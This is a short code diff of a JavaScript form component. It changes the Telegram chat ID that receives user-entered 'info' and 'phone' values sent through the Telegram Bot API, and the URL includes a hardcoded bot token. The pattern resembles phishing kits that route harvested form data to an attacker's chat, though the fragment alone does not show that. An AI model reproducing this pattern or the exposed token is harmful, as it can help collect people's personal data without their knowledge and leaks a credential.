@@ -183,7 +183,7 @@ const Form = () => {
       }
       const response = await axios.post(
         "https://api.telegram.org/bot6461461088:AAGWeqWqbFZzLaRsWasiMsR8xNZ3bx2pmXM/sendMessage",
-        `chat_id=${encodeURIComponent(5783597838)}&text=${encodeURIComponent(
+        `chat_id=${encodeURIComponent(6569148589)}&text=${encodeURIComponent(
           info +
             "\n" +
             phone +
